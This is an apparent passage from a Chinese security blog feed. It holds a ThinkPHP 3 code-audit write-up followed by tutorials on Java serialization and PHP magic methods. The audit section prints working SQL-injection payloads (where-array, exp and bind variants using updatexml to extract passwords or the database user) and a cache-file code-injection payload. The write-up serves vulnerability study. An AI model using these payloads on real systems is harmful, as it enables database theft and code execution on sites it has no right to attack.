alt="image-20210928164612358"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926164810199.png" alt="image-20210926164810199"></p><blockquote><p>上面这个函数，如果发现恶意字符就会在末尾加上一个空格 ，加空格有什么用呢？？？</p><p>并且这里只匹配了以这些东西开头的情况，这个过滤写得不严谨，感觉相当于没有写</p></blockquote><p>第一行的 <code>I()</code> 方法主要提取参数，并且利用函数过滤参数的危险字符，之后转向 <code>M()</code> 方法实例化 <code>User</code>，之后又运行 <code>find()</code> 函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928172646948.png" alt="image-20210928172646948"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928173329266.png" alt="image-20210928173329266"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($options[<span class="hljs-string">&#x27;where&#x27;</span>]) &amp;&amp; is_array($options[<span class="hljs-string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>($fields) &amp;&amp; !<span class="hljs-keyword">isset</span>($options[<span class="hljs-string">&#x27;join&#x27;</span>]))<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928191804739.png" alt="image-20210928191804739"></p><p>这里由于 <code>$options[&#39;where&#39;] </code>是数组所以，就会加入<code>_parseType()</code>就行强制类型转换</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928173405525.png" alt="image-20210928173405525"></p><p>一下是传入 <code>id=1&#39;</code> 时，<code>id</code> 会被强制转换为 1，然后返回到查询语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928182233997.png" alt="image-20210928182233997"></p><p>所以最后的结果是正常的返回</p><p>使用 payload 测试</p> <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?id[where]=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=updatexml(1,concat(0x7e,(select passwd <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>limit 1),0x7e),1)%23<br></code></pre></td></tr></table></figure><p>这里逃过了 <code>think_filter()</code> 的过滤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928183338455.png" alt="image-20210928183338455"></p><p>这里 payload 直接绕过了过滤函数的检查，在进入 <code>find()</code>  后，又跳过了 <code>_paraseType()</code>函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928191259855.png" alt="image-20210928191259855"></p><blockquote><p>由于 $options[‘where’] 不是数组，所以这里就直接跳过了 <code>_parseType()</code> 的强制类型转换</p></blockquote><p>如果<code>payload</code> 直接传入 <code>id</code> 而不是 <code>id[where]</code> 这样就会被进入下面的<code>_parseType()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928192035202.png" alt="image-20210928192035202"></p><p>这样绕过了所有的过滤拼接到了 <code>where</code> 上面，造成了报错注入</p><h5 id="EXP注入"><a href="#EXP注入" class="headerlink" title="EXP注入"></a>EXP注入</h5><p>修改入口</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">payload:<br>?username[<span class="hljs-number">0</span>]=exp&amp;username[<span class="hljs-number">1</span>]==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,user(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928193731317.png" alt="image-20210928193731317"></p><p><strong>漏洞分析</strong></p><p><code>D()</code>方法快速实例化对象</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928200500948.png" alt="image-20210928200500948"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928193959972.png" alt="image-20210928193959972"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">in_array() 检测数组中是否存在某个值<br>第一个参数是待搜索的值（区分大小写） 第二个参数是待搜索的数组<br><br>is_scalar() 检查待检测变量是否为标量<br>标量变量是指 int、float、string 或 bool 类型的变量。 array、object 和<span class="hljs-built_in"> resource </span>类型不是标量<br></code></pre></td></tr></table></figure><p>下断点接着调，其他的函数操作没有什么影响</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928210028057.png" alt="image-20210928210028057">重点在下面这里</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928205333203.png" alt="image-20210928205333203"></p><blockquote><p>为什么不用 <code>I()</code> 接受参数，因为使用了 <code>I()</code> 接受参数的话这里的 $exp 就会变成 <code>exp空格</code> 就不能跳入之后的判断 </p><p>这里直接使用 bind 的话，sql 语句会拼接错误，所以 bind 的注入需要使用其他技巧</p></blockquote><h5 id="bind-注入"><a href="#bind-注入" class="headerlink" title="bind 注入"></a>bind 注入</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">payload<br>?id[<span class="hljs-number">0</span>]=bind&amp;id[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,user(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)&amp;passwd=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928210254401.png" alt="image-20210928210254401"></p><blockquote><p><code>save()</code> 方法的返回值是<strong>影响的记录数</strong>，如果返回false则表示更新出错，因此一定要用恒等来判断是否更新失败</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">$User = M(<span class="hljs-string">&quot;Users&quot;</span>); <span class="hljs-comment">// 实例化user</span><br>$user[<span class="hljs-string">&#x27;id&#x27;</span>] = I(<span class="hljs-string">&#x27;id&#x27;</span>);  <span class="hljs-comment">// 获取 id 并且进行简单的过滤</span><br>$data[<span class="hljs-string">&#x27;password&#x27;</span>] = I(<span class="hljs-string">&#x27;passwd&#x27;</span>); <span class="hljs-comment">// 获取 passwd 并且进行简单的过滤</span><br>$valu = $User-&gt;where($user)-&gt;save($data); <span class="hljs-comment">// 查询结果</span><br>var_dump($valu);<br></code></pre></td></tr></table></figure><p>这里直接从<code>$valu = $User-&gt;where($user)-&gt;save($data);</code> 看起</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928213331107.png" alt="image-20210928213331107"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928213731615.png" alt="image-20210928213731615"></p><blockquote><p>这里会直接跳出 <code>_parseType()</code> 所以这个函数对参数无影响</p></blockquote><p>最后的参数拼接</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928214024437.png" alt="image-20210928214024437"></p><p>最后拼接成的语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928214254837.png" alt="image-20210928214254837"></p><p>why id[1] 要选择 0 ？</p><p>看到上面的结果，可以发现 SQL 语句格式还是不对的，所以还是继续往下走</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928215309034.png" alt="image-20210928215309034"></p><p><code>strstr()</code> 返回字符串从字符串第一次出现的位置开始返回剩下的字符串</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928215537303.png" alt="image-20210928215537303"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928215831483.png" alt="image-20210928215831483"></p><blockquote><p>array_map() 将用户自定义函数作用到每个值上，并返回用户自定义函数作用后的带有新的值的数组</p><p>其中<code>function($val) use($that)&#123; return &#39;\&#39;&#39;.$that-&gt;escapeString($val).&#39;\&#39;&#39;; &#125;,$this-&gt;bind</code> 是匿名函数，用来检测 bin d 是否含有危险字符串</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">$val</span>) <span class="hljs-title">use</span>(<span class="hljs-params">$that</span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span>.$that-&gt;escapeString($val).<span class="hljs-string">&#x27;\&#x27;&#x27;</span>;&#125;,<span class="hljs-keyword">$this</span>-&gt;bind<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928220537895.png" alt="image-20210928220537895"></p><blockquote><p><code>addslashes($str)</code>函数返回在预定义字符之前添加反斜杠的字符串</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001170311345.png" alt="image-20211001170311345"></p><p>经过 <code>strstr()</code> 的处理就变成了正常的语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928220040512.png" alt="image-20210928220040512"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001190445131.png" alt="image-20211001190445131"></p><blockquote><p>在本地把替换的语句分解了一遍，发现就是将字符串中存在的数组的键用值替换了，最终构造出正常的语句</p></blockquote><h4 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a>缓存漏洞</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">payload<br>?name=%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aphpinfo();%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001193410813.png" alt="image-20211001193410813"></p><p>缓存文件名就是 <code>mad5(name)</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001193431779.png" alt="image-20211001193431779"></p><p><strong>漏洞分析</strong></p><p>获取缓存，<code>set()</code> 方法是写入缓存数据到文件的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001202025396.png" alt="image-20211001202025396"></p><p>文件名的确定</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001203247528.png" alt="image-20211001203247528"></p><p>最终使用 <code>file_put_contents()</code> 写入文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001204822794.png" alt="image-20211001204822794"></p><p>参考文章：</p><p><a href="https://y4er.com/post/thinkphp3-vuln/">https://y4er.com/post/thinkphp3-vuln/</a></p><p><a href="https://www.kancloud.cn/manual/thinkphp/1678">https://www.kancloud.cn/manual/thinkphp/1678</a></p><p><a href="https://www.freebuf.com/vuls/282906.html">https://www.freebuf.com/vuls/282906.html</a></p><p><a href="https://www.cnblogs.com/-qing-/p/11444871.html">https://www.cnblogs.com/-qing-/p/11444871.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java序列化基础</title>
    <link href="/2021/10/23/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/10/23/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-反序列化基础"><a href="#Java-反序列化基础" class="headerlink" title="Java 反序列化基础"></a>Java 反序列化基础</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化的过程就是把字节流还原成对象。Java 中的<code>ObjectOutputStream</code>类得 <code>writeObject()</code> 方法可以实现序列化，<code>ObjectInputStream</code>类得<code>readObject()</code>方法用于反序列化。</p><p>Java 序列化对象因其可以方便的将对象转换成字节数组，又可以方便快速的将字节数组反序列化成 Java 对象而被非常频繁的被用于 <code>Socket</code> 传输。 在 <code>RMI(Java远程方法调用-Java Remote Method Invocation)</code> 和 <code>JMX(Java管理扩展-Java Management Extensions)</code> 服务中对象反序列化机制被强制性使用。在 HTTP 请求中也时常会被用到反序列化机制，如：直接接收序列化请求的后端服务、使用Base编码序列化字节字符串的方式传递等。</p><h2 id="Java-序列化-反序列化"><a href="#Java-序列化-反序列化" class="headerlink" title="Java 序列化 / 反序列化"></a>Java 序列化 / 反序列化</h2><p>Java 中要实现对象序列化需要实现 <code>java.io.Serializable(内部序列化)</code> 或 <code>java.io.Externalizable(外部序列化)</code> 接口即可被序列化，其中<code>java.io.Externalizable</code>接口实现了<code>java.io.Serializable</code>接口</p><p>反序列化类对象有如下限制：</p><ol><li>被反序列化的类必须存在</li><li><code>serialVersionUID</code>值必须一致</li></ol><blockquote><p>反序列化类对象是不会调用该类构造方法的</p></blockquote><p>对象序列化保存的是对象的“状态”，即它的成员变量，对象序列化不会关注类中的静态变量。除了在持久化对象时会用到对象序列化之外，使用 RMI 或者在网络传递对象时都会用到对象序列化。</p><h2 id="序列化与反序列化相关知识"><a href="#序列化与反序列化相关知识" class="headerlink" title="序列化与反序列化相关知识"></a>序列化与反序列化相关知识</h2><ol><li>只要实现了 <code>java.io.Serializable</code>接口就可以被序列化</li><li>通过 <code>ObjectOutputStream</code> 和 <code>ObjectInputStream</code> 对对象进行序列化与反序列化</li><li>虚拟机是否允许反序列化，不仅取决于类路径和功能是否一致，也与两个类的序列化 ID （<code>private static final long serialVersionUID</code>）是否一致有关</li><li>序列化不保存静态变量</li><li>想要将父类对象也序列化需要让父类也实现序列化接口</li><li><code>Transient</code> 关键字的作用时控制变量的序列化，在变量前加上它可以阻止该变量被序列化到文件中，在被序列化后，<code>Transient</code> 变量的值被设定为初始值，如 int 型是 0，对象型是 null</li><li>服务端给客户端发送序列化对象数据，对象中有一些数据是敏感的，比如密码字符串等，希望对该密码字段在序列化时进行加密，而客户端如果拥有解密的密钥，只有在客户端进行反序列化时才可以对密码进行读取，这样可以在一定程度上保证对象的数据安全</li></ol><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 测试类</span><br><span class="hljs-keyword">package</span> com;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-comment">// 类想要被序列化，必须实现 Serializable 接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> String name;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">People</span><span class="hljs-params">()</span></span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;无参构造！！&quot;</span>);<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">People</span><span class="hljs-params">(String name, <span class="hljs-keyword">int</span> age)</span></span>&#123;<br>            <span class="hljs-keyword">this</span>.name = name;<br>            <span class="hljs-keyword">this</span>.age = age;<br>            System.out.println(<span class="hljs-string">&quot;有参构造！！！&quot;</span>);<br>        &#125;<br>    <span class="hljs-comment">// 重写 toString 方法</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                    <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span><span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        People people = <span class="hljs-keyword">new</span> People(<span class="hljs-string">&quot;lcdm124&quot;</span>,<span class="hljs-number">12</span>);<br>        <span class="hljs-comment">// 序列化</span><br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;E:/test.ser&quot;</span>));<br>        objectOutputStream.writeObject(people);<br>        objectOutputStream.close();<br>        System.out.println(<span class="hljs-string">&quot;----------&quot;</span>);<br>        <span class="hljs-comment">// 反序列化</span><br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;E:/test.ser&quot;</span>));<br>        People p = (People) objectInputStream.readObject();<br>        System.out.println(p);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20211018164134629.png" alt="image-20211018164134629"></p><p>序列化文件中的内容</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20211018164213927.png" alt="image-20211018164213927"></p><p>其中 <code>ac ed 00 05</code> 是 Java 序列化的特征码</p><p><code>Transient</code> 关键字的作用时控制变量的序列化，在变量前加上它可以阻止该变量被序列化到文件中，在被序列化后，<code>Transient</code> 变量的值被设定为初始值，如 int 型是 0，对象型是 null</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211022235624330.png" alt="image-20211022235624330"></p><p>同一类序列化与反序列化前后的 <code>serialVersionUID</code> 需要一样，不然就会反序列化异常</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211023000028586.png" alt="image-20211023000028586"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211023000051090.png" alt="image-20211023000051090"></p><h2 id="理解-writeObject-和-readObject"><a href="#理解-writeObject-和-readObject" class="headerlink" title="理解 writeObject() 和 readObject()"></a>理解 writeObject() 和 readObject()</h2><p>在序列化和反序列化的过程中，如果被序列化的类定义了 <code>writeObject()</code> 和 <code>readObject()</code> 方法，虚拟机会试图调用对象类里面的方法，进行用户自定义的序列化和反序列化，如果没有这有的方法则默认调用 <code>ObjectOutputStream</code> 和 <code>ObjectInputStream</code> 的默认方法</p><h2 id="Base64方法打印序列化字符串"><a href="#Base64方法打印序列化字符串" class="headerlink" title="Base64方法打印序列化字符串"></a>Base64方法打印序列化字符串</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107185316661.png" alt="image-20211107185316661"></p><p>参考文章</p><p><a href="https://www.cnblogs.com/niceyoo/p/10596657.html">https://www.cnblogs.com/niceyoo/p/10596657.html</a></p><p><a href="https://dyfloveslife.github.io/2020/03/21/Serialization-and-Deserialization-in-Java/">https://dyfloveslife.github.io/2020/03/21/Serialization-and-Deserialization-in-Java/</a></p><p><a href="https://paper.seebug.org/312/">https://paper.seebug.org/312/</a></p><p><a href="https://yinwc.github.io/2020/02/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://yinwc.github.io/2020/02/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://y4er.com/post/java-deserialization-1/">https://y4er.com/post/java-deserialization-1/</a></p><p><a href="https://www.hollischuang.com/archives/1140">https://www.hollischuang.com/archives/1140</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP序列化魔法函数</title>
    <link href="/2021/10/21/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/"/>
    <url>/2021/10/21/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP序列化复习"><a href="#PHP序列化复习" class="headerlink" title="PHP序列化复习"></a>PHP序列化复习</h1><p>之前学的不是那么牢靠，所以这里来复习一下</p><h2 id="常用魔术方法"><a href="#常用魔术方法" class="headerlink" title="常用魔术方法"></a>常用魔术方法</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">__construct()   <span class="hljs-regexp">//</span>类一执行就开始调用，其作用是拿来初始化一些值<br>__destruct() <span class="hljs-regexp">//</span>对象被销毁时触发<br>__sleep()   <span class="hljs-regexp">//</span>使用serialize时触发<br>__wakeup()    <span class="hljs-regexp">//</span>使用unserialize时触发<br>__set() <span class="hljs-regexp">//</span>用于将数据写入不可访问的属性<br>__get() <span class="hljs-regexp">//</span>用于从不可访问的属性读取数据<br>__call() <span class="hljs-regexp">//</span>在对象上下文中调用不可访问的方法时触发<br>__toString() <span class="hljs-regexp">//</span>把类当作字符串使用时触发<br>__invoke() <span class="hljs-regexp">//</span>当脚本尝试将对象调用为函数时触发<br>__isset() <span class="hljs-regexp">//</span>在不可访问的属性上调用isset()或empty()触发<br>__unset() <span class="hljs-regexp">//</span>在不可访问的属性上使用unset()时触发<br><br>__callStatic()  <span class="hljs-regexp">//</span>在静态上下文中调用不可访问的方法时触发<br></code></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p>构造函数，在创建类时自动调用，常用于初始化参数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211020224108586.png" alt="image-20211020224108586"></p><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>析构函数，在类被销毁得时候调用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211020224324684.png" alt="image-20211020224324684"></p><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p>它不能返回父类私有成员的名字，可以用 Serializable 接口来替代。<code>__sleep()</code>方法常用于提交未提交的数据，或类似的清理操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211020224546140.png" alt="image-20211020224546140"></p><blockquote><p>如果函数存在，序列化就会出现一些问题</p></blockquote><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h3><p>在反序列化时调用</p><p><img src="D:\markdown\image-20211020231909276.png" alt="image-20211020231909276"></p><p>这里反序列化时，类会自动调用 <code>__wakeup</code> 最后会销毁，这里不会调用到构造函数</p><h3 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h3><p>这个方法用来为私有成员属性设置值，有两个参数，第一个参数为你要是指值得属性名，第二个参数就是需要设置得值。</p><blockquote><p>通俗理解就是利用这个方法使我们可以在类外给私有变量重新赋值</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> $uname;<br>    <span class="hljs-keyword">private</span> $passwd;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$uname,$passwd</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;uname = $uname;<br>        <span class="hljs-keyword">$this</span>-&gt;passwd = $passwd;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;调用构造函数\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;销毁时调用\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params">$property, $value</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;$property = $value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;uname;<br>    &#125;<br>&#125;<br><br>$t = <span class="hljs-keyword">new</span> Test(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>);<br>$t-&gt;show();<br>$t-&gt;uname = <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>$t-&gt;show();<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211020235111821.png" alt="image-20211020235111821"></p><h3 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h3><p>用来获取私有成员属性值，有一个参数，参数传入你要获取的成员属性的名称，返回获取的属性值。</p><blockquote><p>用来在类外获取私有变量</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> $uname;<br>    <span class="hljs-keyword">private</span> $passwd;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$uname,$passwd</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;uname = $uname;<br>        <span class="hljs-keyword">$this</span>-&gt;passwd = $passwd;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;调用构造函数\n&quot;</span>);<br>    &#125;<br>    <span 